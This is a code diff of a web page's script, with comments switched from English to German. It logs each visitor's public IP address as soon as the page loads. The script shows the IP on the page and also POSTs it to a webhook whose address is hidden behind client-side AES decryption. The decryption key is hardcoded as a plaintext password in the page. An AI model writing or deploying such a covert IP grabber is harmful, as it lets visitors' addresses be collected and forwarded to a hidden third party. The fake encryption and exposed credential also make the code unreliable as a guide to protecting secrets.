@@ -48,23 +48,23 @@
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1-crypto-js.js"></script>
     <script>
-        // Entschlüsseln des verschlüsselten Webhooks
-        const encryptedWebhook = "VerschlüsselterWebhookVonServer"; // Der verschlüsselte Webhook
+        // Der verschlüsselte Webhook, den du aus dem Backend erhalten hast
+        const encryptedWebhook = "VerschlüsselterWebhookVonServer"; // Ersetze mit dem tatsächlichen verschlüsselten Webhook
 
-        const secretKey = "meinGeheimesPasswort"; // Ein starkes, zufälliges Passwort
+        const secretKey = "Sigma123!"; // Dein Passwort
         const decryptedWebhook = CryptoJS.AES.decrypt(encryptedWebhook, secretKey).toString(CryptoJS.enc.Utf8);
 
         async function logIP() {
             try {
-                // Fetch the IP address
+                // Holen der IP-Adresse
                 const response = await fetch("https://api.ipify.org?format=json");
                 const data = await response.json();
                 const ip = data.ip;
 
-                // Display the IP address
-                document.getElementById('ipDisplay').textContent = `${ip}`;
+                // Zeige die IP-Adresse auf der Seite an
+                document.getElementById('ipDisplay').textContent = `Your IP: ${ip}`;
 
-                // Send IP to the webhook
+                // Sende die IP-Adresse an den Webhook
                 await fetch(decryptedWebhook, {
                     method: "POST",
                     headers: {
@@ -81,7 +81,7 @@
             }
         }
 
-        // Log the IP as soon as the page loads
+        // Logge die IP-Adresse sobald die Seite geladen wird
         logIP();
     </script>
 </body>
